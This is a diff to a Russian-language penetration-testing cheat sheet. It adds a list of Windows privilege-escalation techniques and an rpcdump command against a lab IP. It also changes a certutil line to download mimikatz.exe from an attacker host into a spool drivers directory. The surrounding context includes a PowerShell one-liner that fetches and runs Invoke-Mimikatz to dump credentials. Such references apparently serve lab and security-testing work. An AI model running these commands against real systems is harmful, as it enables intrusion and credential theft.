@@ -196,6 +196,14 @@ SUID: find / -perm -u=s -type f 2>/dev/null
 
 **Windows**
 
+1. Повышение привилегий через права на создание резервных копий (SeBackupPrivilege)
+2. Повышение привилегий через перехват сервиса (Weak Services Permission)
+3. Повышение привилегий через имперсонификацию SeImpersonatePrivilege (JyicyPotato)
+4. Повышение привилегий через права на установку ПО (AlwaysInstallElevated)
+5. Повышение привилегий через изменение пути бинарного файла сервиса (Service Binary Path)
+6. Повышение привилегий через подмену DLL библиотек (DLL Hijacking)
+7. Повышение привилегий через неэкранированные пути сервисов (Unquoted Service Paths)
+
 Mimikatz
 ```
 powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
@@ -209,6 +217,11 @@ WinPEAS
     https://github.com/carlospolop/PEASS-ng/releases/download/20230413-7f846812/winPEASx64.exe
 
 Найти не экранированные сервисы (подробнее: https://juggernaut-sec.com/unquoted-service-paths/):
+
+Сбор сведений о RPC
+```
+rpcdump.py @10.10.10.175 | egrep 'MS-RPRN|MS-PAR'
+```
 
 ```
 wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\windows\\" | findstr /i /v """
@@ -232,7 +245,7 @@ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 ```
 ### Перенос файлов
 ```
-certutil -urlcache -split -f http://10.10.14.16/mimikatz.exe m.exe
+certutil -urlcache -split -f http://10.10.14.16/mimikatz.exe C:\Windows\System32\spool\drivers\color\m.exe
 ```
 
 ## Active Directory
